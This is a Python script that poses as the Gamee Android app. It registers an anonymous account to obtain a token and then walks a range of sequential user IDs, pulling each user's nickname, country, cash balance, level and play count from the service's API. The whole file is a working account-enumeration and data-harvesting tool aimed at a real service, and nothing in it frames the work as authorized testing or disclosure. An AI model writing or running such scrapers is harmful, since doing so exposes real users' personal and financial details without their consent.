import urllib.request
import json
import ssl
import uuid
import gzip
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://api.gamee.com/"
install_uuid = str(uuid.uuid4())
ctx = ssl.create_default_context()

def req(payload, token=None):
    headers = {
        "User-Agent": "Gamee/5.18.2.0 (com.gameeapp.android.app; Android 30; mfr Google; mdl Pixel 8a; disp Pixel 8a; res 1080x2400)",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Client-Language": "en",
        "X-Install-Uuid": install_uuid
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = json.dumps(payload).encode('utf-8')
    r = urllib.request.Request(url, data=data, headers=headers, method="POST")
    with urllib.request.urlopen(r, context=ctx, timeout=15) as resp:
        raw = resp.read()
        try:
            raw = gzip.decompress(raw)
        except Exception:
            pass
        return json.loads(raw.decode('utf-8'))

reg = req([{
    "jsonrpc": "2.0",
    "id": "reg",
    "method": "user.authentication.registerAnonymousUser",
    "params": {"platform": "app-android", "language": "en", "country": "US", "referralCode": None, "metadata": {}}
}])[0]
token = reg["result"]["tokens"]["authenticate"]

def fetch_user(uid):
    try:
        res = req([{
            "jsonrpc": "2.0",
            "id": f"u_{uid}",
            "method": "user.get",
            "params": {"userId": uid}
        }], token)[0]
        if "result" in res and res["result"]:
            r = res["result"]
            gamee = r.get("gamee", {})
            personal = r.get("personal", {})
            return {
                "id": uid,
                "nickname": personal.get("nickname", "N/A"),
                "country": personal.get("countryId", "--"),
                "money_usd": gamee.get("moneyUsdCents", 0) / 100.0,
                "xp": gamee.get("experience", 0),
                "level": gamee.get("level", 1),
                "gameplays": gamee.get("gameplays", 0),
                "share_url": gamee.get("shareUrl", "")
            }
    except Exception:
        pass
    return None

print("[*] Enumerating accounts 139657100 - 139657115...")
with ThreadPoolExecutor(max_workers=5) as ex:
    futures = [ex.submit(fetch_user, uid) for uid in range(139657100, 139657116)]
    for f in as_completed(futures):
        u = f.result()
        if u:
            nick = u["nickname"]
            money = u["money_usd"]
            level = u["level"]
            xp = u["xp"]
            plays = u["gameplays"]
            country = u["country"]
            uid = u["id"]
            print(f"  [ID: {uid}] {nick:<22} | Balance: ${money:>6.2f} | Lv.{level} (XP: {xp:>3}) | Plays: {plays:>2} | {country}")
